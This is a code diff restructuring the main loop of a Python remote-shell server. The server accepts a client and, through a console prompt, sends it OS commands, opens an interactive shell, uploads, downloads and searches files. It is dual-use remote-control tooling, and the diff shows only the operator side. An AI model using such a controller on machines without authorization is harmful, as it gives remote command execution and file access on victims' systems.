@@ -838,148 +838,149 @@ def main():
         # Now we will start a while loop that will accept a connection. 
         # If the client drops the server will remain up.
         while True:
-            print("{}[-]{} Listening for connections on 0.0.0.0 ...".format(wht, stop))
-            if log == True:
-                logger("{}[-]{} Listening for connections on 0.0.0.0 ...\n".format(wht, stop))
-            # we will now use the accept method once a client reaches out
-            conn, addr = srvr.accept()
-            ip_addr = addr[0]
-            # Print that a connection has occurrd
-            print("{}[-]{} Connection established with client at {} !".format(wht, stop, str(ip_addr)))
-            if log == True:
-                logger("{}[-]{} Connection established with client at {}!\n".format(wht, stop, str(ip_addr)))
-            # Initialize an internal while loop for data handling
-            data = b'start'
-            cmd_list = []
-            # We start our loop to handle commands as long as data isn't quit or exit
-            while data != b'qt' or data != b'ex':
-                # We get the working directory and username from the client.
-                client_info = myrecvall(conn, delimiter).decode()
-                # split the information received and use the name and working dir as prompt
-                client_name, client_CWD = client_info.split(';')
-                print('{}[-]{} Enter server command or press ? for server command list'.format(wht, stop))
+            try:
+                print("{}[-]{} Listening for connections on 0.0.0.0 ...".format(wht, stop))
                 if log == True:
-                    logger('{}[-]{} Enter server command or press ? for server command list\n'.format(wht, stop))
-                # We print the server commands
-                prompt = '{3}[-]{4} {0}@{1}: {2}> '.format(client_name, ip_addr, client_CWD, wht, stop)
+                    logger("{}[-]{} Listening for connections on 0.0.0.0 ...\n".format(wht, stop))
+                # we will now use the accept method once a client reaches out
+                conn, addr = srvr.accept()
+                ip_addr = addr[0]
+                # Print that a connection has occurrd
+                print("{}[-]{} Connection established with client at {} !".format(wht, stop, str(ip_addr)))
                 if log == True:
-                    logger('{3}[-]{4} {0}@{1}: {2}>\n'.format(client_name, ip_addr, client_CWD, wht, stop))
-                # Now we have our prompt: {}[-]{} user@ip:working_directory>
-                # This will take the byte encoded input 
-                # from the user and save it in a variable
-                data = input(prompt).strip().encode()
-                cmd_list.append(data)
-                # This will call the function defined above, we are passing the connection
-                mysendall(conn, data, delimiter) 
-                # Start our conditional for dealing with server commands
-                exlist = [b'qt', b'ex']
-                # First we check if the command was l!
-                if b'l!' in data:
-                    if data == b'l!':
-                        data = cmd_list[-1]
-                        print(data)
-                if data == b'dl':
-                    # Deal with a download request
-                    download(conn, delimiter)
-                    # Wait for next server command
-                    continue
-                elif data == b'b':
-                    bnnr_roll()
-                elif data == b'hs':
-                    # This will show you all the server commands you enterd
-                    for cmd in cmd_list:
-                        if cmd == b'hs':
-                            pass
-                        else:
-                            print('    {0}{2}{1} {3}'.format(magenta, stop, cmd_list.index(cmd), cmd))
-                            if log == True:
-                                logger('    {0}{2}{1} {3}\n'.format(magenta, stop, cmd_list.index(cmd), cmd))
-                    continue
-                elif data == b'dc':
-                    # Print the client disconnect message on the screen
-                    print(myrecvall(conn, delimiter).decode())
-                    # Close the connection
-                    conn.close()
-                    # Give the user time to read message
-                    time.sleep(1)
-                    # Clear the screen
-                    screen_wipe()
-                    # Break out of our connected loop and listen for a new connection
-                    break
-                elif data == b'ul':
-                    # Deal wih an upload request
-                    upload(conn, delimiter)
-                    # Wait for the next server command
-                    continue
-                elif data == b'src':
-                    # Now we will use our searcher function 
-                    # to search the client
-                    print(searcher(conn, delimiter))
-                    # Wait for the next server command
-                    continue
-                elif data == b'cl':
-                    # Use the screen wipe to clear the screen
-                    screen_wipe()
-                    # Wait for the next server command
-                    continue
-                elif data == b'?':
-                    # If ? is enterd display a list of server commands
-                    print(srvr_cmds)
-                    # Wait for the next command
-                    continue
-                elif data == b'cmd':
-                    print(myrecvall(conn, delimiter).decode())
-                    ask = input('{}[-]{} s - single or m - multiple:> '.format(trquise, stop)).strip()
+                    logger("{}[-]{} Connection established with client at {}!\n".format(wht, stop, str(ip_addr)))
+                # Initialize an internal while loop for data handling
+                data = b'start'
+                cmd_list = []
+                # We start our loop to handle commands as long as data isn't quit or exit
+                while data != b'qt' or data != b'ex':
+                    # We get the working directory and username from the client.
+                    client_info = myrecvall(conn, delimiter).decode()
+                    # split the information received and use the name and working dir as prompt
+                    client_name, client_CWD = client_info.split(';')
+                    print('{}[-]{} Enter server command or press ? for server command list'.format(wht, stop))
                     if log == True:
-                        logger('{}[-]{} s - single or m - multiple:>\n'.format(trquise, stop))
-                    mysendall(conn, ask.encode(), delimiter)
-                    if ask.lower().startswith('s'):
-                        print('{}[-]{} Enter os command or type bk to go back'.format(trquise, stop))
-                        if log == True:
-                            logger('{}[-]{} Enter os command or type bk to go back\n'.format(trquise, stop))
-                        data = input('{}[-]{} What command:> '.format(trquise, stop)).strip().encode()
-                        if log == True:
-                            logger('{}[-]{} What command:>\n'.format(trquise, stop))
-                        # Enter the command function to run commands
-                        command(conn, data, delimiter)
+                        logger('{}[-]{} Enter server command or press ? for server command list\n'.format(wht, stop))
+                    # We print the server commands
+                    prompt = '{3}[-]{4} {0}@{1}: {2}> '.format(client_name, ip_addr, client_CWD, wht, stop)
+                    if log == True:
+                        logger('{3}[-]{4} {0}@{1}: {2}>\n'.format(client_name, ip_addr, client_CWD, wht, stop))
+                    # Now we have our prompt: {}[-]{} user@ip:working_directory>
+                    # This will take the byte encoded input 
+                    # from the user and save it in a variable
+                    data = input(prompt).strip().encode()
+                    cmd_list.append(data)
+                    # This will call the function defined above, we are passing the connection
+                    mysendall(conn, data, delimiter) 
+                    # Start our conditional for dealing with server commands
+                    exlist = [b'qt', b'ex']
+                    # First we check if the command was l!
+                    if b'l!' in data:
+                        if data == b'l!':
+                            data = cmd_list[-1]
+                            print(data)
+                    if data == b'dl':
+                        # Deal with a download request
+                        download(conn, delimiter)
+                        # Wait for next server command
+                        continue
+                    elif data == b'b':
+                        bnnr_roll()
+                    elif data == b'hs':
+                        # This will show you all the server commands you enterd
+                        for cmd in cmd_list:
+                            if cmd == b'hs':
+                                pass
+                            else:
+                                print('    {0}{2}{1} {3}'.format(magenta, stop, cmd_list.index(cmd), cmd))
+                                if log == True:
+                                    logger('    {0}{2}{1} {3}\n'.format(magenta, stop, cmd_list.index(cmd), cmd))
+                        continue
+                    elif data == b'dc':
+                        # Print the client disconnect message on the screen
+                        print(myrecvall(conn, delimiter).decode())
+                        # Close the connection
+                        conn.close()
+                        # Give the user time to read message
+                        time.sleep(1)
+                        # Clear the screen
+                        screen_wipe()
+                        # Break out of our connected loop and listen for a new connection
+                        break
+                    elif data == b'ul':
+                        # Deal wih an upload request
+                        upload(conn, delimiter)
                         # Wait for the next server command
                         continue
-                    elif ask.lower().startswith('m'):
-                        # start a shell with the client
-                        multi(conn, delimiter, ip_addr)
+                    elif data == b'src':
+                        # Now we will use our searcher function 
+                        # to search the client
+                        print(searcher(conn, delimiter))
+                        # Wait for the next server command
                         continue
-                elif data == b'h':
-                    # Deal with help command by calling help function
-                    helper()
-                    # Wait for the next server command
-                    continue 
-                elif data in exlist:
-                    # Print the disconnection message from the client
-                    print(myrecvall(conn, delimiter).decode())
-                    # Wait for one second before clearing screen
-                    if log == True:
-                        logger('[-] Server log end at: {}\n'.format(datetime.datetime.now())+'='*50+'\n')
-                    time.sleep(1)
-                    # Clear the screen 
-                    screen_wipe()
-                    # Close the server
-                    srvr.close()
-                    # Print a goodbye message
-                    print('\n{}[-]{} Good Day Sir, you win nothing nada zip!\n'.format(wht, stop))
-                    sys.exit()
-                elif data == b'sh':
-                    shell(conn, delimiter)
-                    continue
-    except KeyboardInterrupt:
-        # If a ctrl + c is enterd we print the message
-        print("\n{}[-]{} Good Day Sir! I said good day!".format(wht, stop))  
-        if log == True:
-            logger("{}[-]{} Good Day Sir! I said good day!".format(wht, stop))  
-            logger('[-] Server log end at: {}'.format(datetime.datetime.now())+'\n'+'='*50+'\n')
-        # Close the server object
-        srvr.close()
-        # Exit the program
-        sys.exit()
+                    elif data == b'cl':
+                        # Use the screen wipe to clear the screen
+                        screen_wipe()
+                        # Wait for the next server command
+                        continue
+                    elif data == b'?':
+                        # If ? is enterd display a list of server commands
+                        print(srvr_cmds)
+                        # Wait for the next command
+                        continue
+                    elif data == b'cmd':
+                        print(myrecvall(conn, delimiter).decode())
+                        ask = input('{}[-]{} s - single or m - multiple:> '.format(trquise, stop)).strip()
+                        if log == True:
+                            logger('{}[-]{} s - single or m - multiple:>\n'.format(trquise, stop))
+                        mysendall(conn, ask.encode(), delimiter)
+                        if ask.lower().startswith('s'):
+                            print('{}[-]{} Enter os command or type bk to go back'.format(trquise, stop))
+                            if log == True:
+                                logger('{}[-]{} Enter os command or type bk to go back\n'.format(trquise, stop))
+                            data = input('{}[-]{} What command:> '.format(trquise, stop)).strip().encode()
+                            if log == True:
+                                logger('{}[-]{} What command:>\n'.format(trquise, stop))
+                            # Enter the command function to run commands
+                            command(conn, data, delimiter)
+                            # Wait for the next server command
+                            continue
+                        elif ask.lower().startswith('m'):
+                            # start a shell with the client
+                            multi(conn, delimiter, ip_addr)
+                            continue
+                    elif data == b'h':
+                        # Deal with help command by calling help function
+                        helper()
+                        # Wait for the next server command
+                        continue 
+                    elif data in exlist:
+                        # Print the disconnection message from the client
+                        print(myrecvall(conn, delimiter).decode())
+                        # Wait for one second before clearing screen
+                        if log == True:
+                            logger('[-] Server log end at: {}\n'.format(datetime.datetime.now())+'='*50+'\n')
+                        time.sleep(1)
+                        # Clear the screen 
+                        screen_wipe()
+                        # Close the server
+                        srvr.close()
+                        # Print a goodbye message
+                        print('\n{}[-]{} Good Day Sir, you win nothing nada zip!\n'.format(wht, stop))
+                        sys.exit()
+                    elif data == b'sh':
+                        shell(conn, delimiter)
+                        continue
+            except KeyboardInterrupt:
+                # If a ctrl + c is enterd we print the message
+                print("\n{}[-]{} Good Day Sir! I said good day!".format(wht, stop))  
+                if log == True:
+                    logger("{}[-]{} Good Day Sir! I said good day!".format(wht, stop))  
+                    logger('[-] Server log end at: {}'.format(datetime.datetime.now())+'\n'+'='*50+'\n')
+                # Close the server object
+                data = b'ctrl+c'
+                mysendall(conn, data, delimiter)
+                print(myrecvall(conn, delimiter).decode())
     except Exception as e:
         # Print any error received from server side during connection attempt
         type_e = str(type(e)).split()[1].split('>')[0]
